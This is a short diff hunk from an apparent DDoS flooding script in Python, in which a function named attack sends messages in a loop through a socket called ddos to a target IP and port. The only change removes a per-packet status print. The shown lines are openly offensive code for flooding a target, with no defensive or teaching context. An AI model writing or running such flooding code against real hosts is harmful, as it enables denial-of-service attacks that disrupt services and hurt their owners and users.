@@ -19,7 +19,6 @@ def attack(ip, port):
             ddos.sendto(message.encode(), (ip_addr, port))
             with print_lock:
                 packet_count += 1
-                print(f"Sent packet to {ip}:{port}")
         except socket.error as msg:
             with print_lock:
                 print("|[Connection Failed] |")
